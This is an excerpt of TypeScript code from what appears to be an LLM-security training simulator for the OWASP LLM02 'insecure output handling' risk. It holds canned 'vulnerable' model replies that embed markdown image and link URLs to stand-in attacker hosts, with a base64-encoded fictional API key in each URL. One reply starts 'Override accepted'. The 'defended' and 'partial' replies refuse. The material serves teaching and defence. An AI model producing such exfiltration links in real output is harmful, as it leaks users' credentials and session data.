...
const VULNERABLE: Record<string, ResponseFn> = {
  ...
  // ── Output Injection ───────────────────────────────────────────────────────
  // Demonstrates LLM02: Insecure Output Handling.
  // The "attack" is a request that tricks the model into embedding external URLs
  // in its markdown output. When rendered, these URLs silently exfiltrate data
  // (session tokens, API keys) to an attacker-controlled endpoint.
  //
  // The simulated vulnerable response shows what a poorly-configured model
  // returns — a markdown response with URLs containing base64-encoded fictional
  // credentials. No real URLs, no real credentials; all training props.

  'output-injection:data_exfiltration': (seed) => {
    const ctx = INTERNAL_UGL_CONTEXT;
    const key = ctx.DEMO_API_KEYS[0]?.value ?? 'sk-ugl-scout-demo-48f2kx9m';
    // Encode the fictional key as base64 to simulate what real output injection does
    const encoded = Buffer.from(key).toString('base64');
    const fragments = [
      `Here is the UGL scouting report you requested:\n\n` +
      `![](https://analytics.ugl-reports.example/px?t=${encoded}&s=${seed.slice(0, 8)})\n\n` +
      `**Q3 Scouting Summary** — Full report loaded. Data rendered above.`,

      `## UGL Draft Board — Internal Preview\n\n` +
      `[View full board](https://internal.ugl-ops.example/board?auth=${encoded})\n\n` +
      `Report includes restricted pre-draft grades for top-50 prospects.`,

      `Your session analytics summary is ready:\n\n` +
      `[![Analytics](https://track.ugl-data.example/beacon?k=${encoded}&ref=${seed.slice(0, 6)})](https://ugl-data.example)\n\n` +
      `Click to view full interactive dashboard.`,
    ];
    return deterministicItem(seed + '/output', fragments);
  },

  'output-injection:prompt_injection':
    `Override accepted. Generating the report you requested with full data access:\n\n` +
    `[![UGL Report](https://collect.ugl-exfil.example/data?payload=c2stdWdsLXNjb3V0LWRlbW8tNDhmMmt4OW0=&bypass=1)](https://ugl.example)\n\n` +
    `Report rendered. Internal credentials included in tracker for analytics purposes.`,
...
const DEFENDED: Record<string, string> = {
  ...
  'output-injection:data_exfiltration':
    `Output sanitisation is active. I don't generate responses containing external image URLs, ` +
    `tracking pixels, or hyperlinks to third-party endpoints — those can be used to exfiltrate ` +
    `data from this context window when rendered in a browser. ` +
    `This is an LLM02 (Insecure Output Handling) attack pattern and it has been blocked.`,

  'output-injection:prompt_injection':
    `I'm not embedding external links or image tags in my output. ` +
    `Rendering user-controlled URLs in my responses would allow data exfiltration via ` +
    `HTTP requests generated by the client — output sanitisation prevents this.`,
...
const PARTIAL: Record<string, string> = {
  ...
  'output-injection:data_exfiltration':
    `I'm not sure I should be including external URLs or image links in this response — ` +
    `that kind of thing can send data somewhere unintended when the output gets rendered. ` +
    `Let me generate a plain-text summary instead, without any tracking elements.`,

  'output-injection:prompt_injection':
    `Something about that request makes me hesitant to embed external links in my response. ` +
    `I'd rather keep the output as plain text to avoid any unintended data transmission.`,
...
export function getScenarioForcedAttackTypeSync(
  ...
  // output-injection: any non-trivial request in this scenario triggers the
  // output-injection attack path. The "attack" is a request for a report/link —
  // the interesting variable is whether the model sanitises its output.
  if (scenarioId === 'output-injection') {
    return 'data_exfiltration';
  }
  return null;
}
...
export async function getScenarioForcedAttackType(
  ...
  // output-injection: any request in this scenario is the attack — the user is
  // asking for a report/link and the vulnerable model responds with tracking pixels.
  if (scenarioId === 'output-injection') {
    return { attackType: 'data_exfiltration' };
  }
...
const LEAKED_CATEGORY_MAP: Record<string, string> = {
  ...
  'output-injection:data_exfiltration':  'API key via rendered markdown URL (output channel exfil)',
  'output-injection:prompt_injection':   'session credential via embedded tracking pixel',
